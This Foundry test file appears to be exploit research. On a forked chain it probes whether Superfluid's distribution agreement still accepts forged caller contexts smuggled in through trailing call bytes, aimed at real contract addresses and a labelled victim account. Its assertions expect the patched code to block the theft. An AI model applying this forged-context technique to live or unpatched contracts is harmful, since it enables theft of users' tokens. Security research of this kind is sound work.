// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
}

interface ISETH is ISuperToken {
    function upgradeByETH() external payable;
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function deleteSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);

    function listSubscriptions(
        ISuperToken token,
        address subscriber
    ) external view returns (address[] memory publishers, uint32[] memory indexIds, uint128[] memory unitsList);
}

/// @title Attempt7
/// @notice Hypothesis: the remaining non-callback path would require either
///         `claim()` to route balances using forged `ctx.msgSender`, or
///         `deleteSubscription()` to share the same ctx-validation gap as
///         `claim()`. This probe checks both behaviors directly on the patched
///         fork with minimal seeded state.
contract Attempt7 is Test {
    struct ClaimObservation {
        bool ok;
        uint256 attackerBefore;
        uint256 attackerAfter;
        uint256 subscriberBefore;
        uint256 subscriberAfter;
        uint256 pendingBefore;
        uint256 pendingAfter;
        bytes innerReturn;
        string revertReason;
    }

    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant KNOWN_USDCX_VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    uint256 constant FORK_BLOCK = 27_039_967;

    uint32 constant CLAIM_INDEX_ATTACKER_CTX = 55_700_001;
    uint32 constant CLAIM_INDEX_VICTIM_CTX = 55_700_002;
    uint32 constant DELETE_INDEX_PLAIN = 55_700_003;
    uint32 constant DELETE_INDEX_TRAILING = 55_700_004;
    uint32 constant DELETE_INDEX_DIRECT = 55_700_005;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    ISETH constant MATICX = ISETH(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(KNOWN_USDCX_VICTIM, "KnownUSDCxVictim");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(address(MATICX), "MATICx");
    }

    function test_claim_ignores_ctx_msgSender_and_deleteSubscription_stays_guarded() public {
        uint256 nativeBefore = ATTACKER.balance;
        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);

        _logForkSubscriptions(ATTACKER, "attacker");
        _logForkSubscriptions(KNOWN_USDCX_VICTIM, "known_victim");

        _seedClaim(CLAIM_INDEX_ATTACKER_CTX, KNOWN_USDCX_VICTIM);
        _seedClaim(CLAIM_INDEX_VICTIM_CTX, KNOWN_USDCX_VICTIM);
        _seedDeleteSubscription(DELETE_INDEX_PLAIN, KNOWN_USDCX_VICTIM);
        _seedDeleteSubscription(DELETE_INDEX_TRAILING, KNOWN_USDCX_VICTIM);
        _seedDeleteSubscription(DELETE_INDEX_DIRECT, KNOWN_USDCX_VICTIM);

        ClaimObservation memory attackerCtxClaim =
            _claimWithForgedMsgSender(CLAIM_INDEX_ATTACKER_CTX, KNOWN_USDCX_VICTIM, ATTACKER);
        ClaimObservation memory victimCtxClaim =
            _claimWithForgedMsgSender(CLAIM_INDEX_VICTIM_CTX, KNOWN_USDCX_VICTIM, KNOWN_USDCX_VICTIM);

        _logClaimObservation("claim_ctx_msgSender_attacker", attackerCtxClaim);
        _logClaimObservation("claim_ctx_msgSender_victim", victimCtxClaim);

        assertTrue(attackerCtxClaim.ok, "claim with attacker ctx.msgSender failed");
        assertTrue(victimCtxClaim.ok, "claim with victim ctx.msgSender failed");

        assertEq(
            attackerCtxClaim.subscriberAfter - attackerCtxClaim.subscriberBefore,
            1,
            "subscriber should receive one wei regardless of ctx.msgSender"
        );
        assertEq(
            victimCtxClaim.subscriberAfter - victimCtxClaim.subscriberBefore,
            1,
            "subscriber should receive one wei regardless of ctx.msgSender"
        );
        assertEq(attackerCtxClaim.attackerAfter - attackerCtxClaim.attackerBefore, 0, "attacker should not receive claim");
        assertEq(victimCtxClaim.attackerAfter - victimCtxClaim.attackerBefore, 0, "attacker should not receive claim");
        assertEq(attackerCtxClaim.pendingBefore, 1, "seeded claim should start pending");
        assertEq(victimCtxClaim.pendingBefore, 1, "seeded claim should start pending");
        assertEq(attackerCtxClaim.pendingAfter, 0, "claim should consume pending amount");
        assertEq(victimCtxClaim.pendingAfter, 0, "claim should consume pending amount");

        ContextUtils.Context memory decodedAttacker = ContextUtils.decodeContext(attackerCtxClaim.innerReturn);
        ContextUtils.Context memory decodedVictim = ContextUtils.decodeContext(victimCtxClaim.innerReturn);
        assertEq(decodedAttacker.msgSender, ATTACKER, "returned ctx should preserve forged attacker sender");
        assertEq(decodedVictim.msgSender, KNOWN_USDCX_VICTIM, "returned ctx should preserve forged victim sender");

        _probeDeleteSubscriptionBehavior();

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker native:", nativeAfter);
        console.logInt(int256(nativeAfter) - int256(nativeBefore));
    }

    function _seedClaim(uint32 indexId, address subscriber) internal {
        _seedBaseIndex(indexId, subscriber);
        vm.prank(ATTACKER);
        _callAgreementOrRevert(abi.encodeCall(IDA.updateIndex, (MATICX, indexId, uint128(1), new bytes(0))), "updateIndex");
    }

    function _seedDeleteSubscription(uint32 indexId, address subscriber) internal {
        _seedBaseIndex(indexId, subscriber);
    }

    function _seedBaseIndex(uint32 indexId, address subscriber) internal {
        vm.prank(ATTACKER);
        MATICX.upgradeByETH{value: 1 wei}();

        vm.startPrank(ATTACKER);
        _callAgreementOrRevert(abi.encodeCall(IDA.createIndex, (MATICX, indexId, new bytes(0))), "createIndex");
        _callAgreementOrRevert(
            abi.encodeCall(IDA.updateSubscription, (MATICX, indexId, subscriber, uint128(1), new bytes(0))),
            "updateSubscription"
        );
        vm.stopPrank();
    }

    function _claimWithForgedMsgSender(
        uint32 indexId,
        address subscriber,
        address fakeMsgSender
    ) internal returns (ClaimObservation memory obs) {
        obs.attackerBefore = MATICX.balanceOf(ATTACKER);
        obs.subscriberBefore = MATICX.balanceOf(subscriber);
        (,,, obs.pendingBefore) = IDA.getSubscription(MATICX, ATTACKER, indexId, subscriber);

        bytes memory fakeCtx = _buildContext(fakeMsgSender, IDA.claim.selector);
        bytes memory wrappedRet;
        vm.prank(ATTACKER);
        (obs.ok, wrappedRet) = _callAgreementWithTrailingBytes(
            abi.encodeCall(IDA.claim, (MATICX, ATTACKER, indexId, subscriber, fakeCtx))
        );

        obs.attackerAfter = MATICX.balanceOf(ATTACKER);
        obs.subscriberAfter = MATICX.balanceOf(subscriber);
        (,,, obs.pendingAfter) = IDA.getSubscription(MATICX, ATTACKER, indexId, subscriber);

        if (obs.ok) {
            obs.innerReturn = _decodeInnerCtx(wrappedRet);
        } else {
            obs.revertReason = _decodeRevert(wrappedRet);
        }
    }

    function _probeDeleteSubscriptionBehavior() internal {
        bytes memory forgedDeleteCtx = _buildContext(KNOWN_USDCX_VICTIM, IDA.deleteSubscription.selector);

        vm.prank(ATTACKER);
        (bool directOk, bytes memory directRet) = address(IDA).call(
            abi.encodeCall(IDA.deleteSubscription, (MATICX, ATTACKER, DELETE_INDEX_DIRECT, KNOWN_USDCX_VICTIM, forgedDeleteCtx))
        );
        console.log("[delete direct] ok:", directOk);
        console.log("[delete direct] decoded:", _decodeRevert(directRet));
        assertFalse(directOk, "direct deleteSubscription unexpectedly succeeded");
        assertEq(_decodeRevert(directRet), "unauthorized host", "unexpected direct delete revert");

        vm.prank(ATTACKER);
        (bool plainOk,) = _callAgreementRaw(
            abi.encodeCall(IDA.deleteSubscription, (MATICX, ATTACKER, DELETE_INDEX_PLAIN, KNOWN_USDCX_VICTIM, new bytes(0)))
        );
        console.log("[delete host plain] ok:", plainOk);
        assertTrue(plainOk, "plain host deleteSubscription should succeed for publisher");
        (bool plainExist,, uint128 plainUnits,) = IDA.getSubscription(MATICX, ATTACKER, DELETE_INDEX_PLAIN, KNOWN_USDCX_VICTIM);
        console.log("[delete host plain] exist:", plainExist);
        console.log("[delete host plain] units:", uint256(plainUnits));
        assertEq(plainUnits, 0, "plain deleteSubscription should zero the subscription units");

        vm.prank(ATTACKER);
        (bool trailingOk, bytes memory trailingRet) = _callAgreementWithTrailingBytes(
            abi.encodeCall(
                IDA.deleteSubscription, (MATICX, ATTACKER, DELETE_INDEX_TRAILING, KNOWN_USDCX_VICTIM, forgedDeleteCtx)
            )
        );
        console.log("[delete host trailing] ok:", trailingOk);
        console.log("[delete host trailing] decoded:", _decodeRevert(trailingRet));
        assertFalse(trailingOk, "trailing forged deleteSubscription unexpectedly succeeded");
        assertEq(_decodeRevert(trailingRet), "invalid ctx", "unexpected trailing delete revert");

        (bool trailingExist,, uint128 trailingUnits,) =
            IDA.getSubscription(MATICX, ATTACKER, DELETE_INDEX_TRAILING, KNOWN_USDCX_VICTIM);
        assertTrue(trailingExist, "trailing revert should preserve subscription");
        assertEq(trailingUnits, 1, "trailing revert should preserve units");
    }

    function _logForkSubscriptions(address subscriber, string memory label) internal view {
        console.log("[fork subscriptions]", label);
        for (uint8 tokenSlot = 0; tokenSlot < 5; ++tokenSlot) {
            (ISuperToken token, string memory symbol) = _tokenAt(tokenSlot);
            (address[] memory publishers, uint32[] memory indexIds, uint128[] memory unitsList) =
                IDA.listSubscriptions(token, subscriber);
            console.log("  token:", symbol);
            console.log("    entries:", publishers.length);
            if (publishers.length > 0) {
                console.log("    first publisher:", publishers[0]);
                console.log("    first indexId:", uint256(indexIds[0]));
                console.log("    first units:", uint256(unitsList[0]));
            }
        }
    }

    function _logClaimObservation(string memory label, ClaimObservation memory obs) internal {
        console.log("[claim]", label);
        console.log("  ok:", obs.ok);
        console.log("  attacker delta:", obs.attackerAfter - obs.attackerBefore);
        console.log("  subscriber delta:", obs.subscriberAfter - obs.subscriberBefore);
        console.log("  pending before:", obs.pendingBefore);
        console.log("  pending after:", obs.pendingAfter);
        if (!obs.ok) {
            console.log("  revert:", obs.revertReason);
            return;
        }

        ContextUtils.Context memory decoded = ContextUtils.decodeContext(obs.innerReturn);
        console.log("  returned msgSender:", decoded.msgSender);
        console.log("  returned appAddress:", decoded.appAddress);
        console.log("  returned appCreditToken:", decoded.appCreditToken);
    }

    function _buildContext(address fakeMsgSender, bytes4 selector) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(fakeMsgSender, selector, "");
        return ContextUtils.encodeContext(ctx);
    }

    function _callAgreementOrRevert(bytes memory inner, string memory step) internal {
        (bool ok, bytes memory ret) = _callAgreementRaw(inner);
        require(ok, string.concat(step, ": ", _decodeRevert(ret)));
    }

    function _callAgreementRaw(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, inner, new bytes(0))));
    }

    function _callAgreementWithTrailingBytes(bytes memory inner) internal returns (bool ok, bytes memory ret) {
        bytes memory outer = abi.encodePacked(inner, abi.encode(new bytes(0)));
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (IDA, outer, new bytes(0))));
    }

    function _decodeInnerCtx(bytes memory wrappedReturn) internal pure returns (bytes memory) {
        bytes memory agreementReturn = abi.decode(wrappedReturn, (bytes));
        return agreementReturn.length == 0 ? bytes("") : abi.decode(agreementReturn, (bytes));
    }

    function _tokenAt(uint8 tokenSlot) internal pure returns (ISuperToken token, string memory symbol) {
        if (tokenSlot == 0) return (ISuperToken(0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2), "DAIx");
        if (tokenSlot == 1) return (ISuperToken(0x27e1e4E6BC79D93032abef01025811B7E4727e85), "ETHx");
        if (tokenSlot == 2) return (ISuperToken(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3), "MATICx");
        if (tokenSlot == 3) return (ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F), "USDCx");
        if (tokenSlot == 4) return (ISuperToken(0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92), "WBTCx");
        revert("bad token slot");
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) return "silent revert";
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
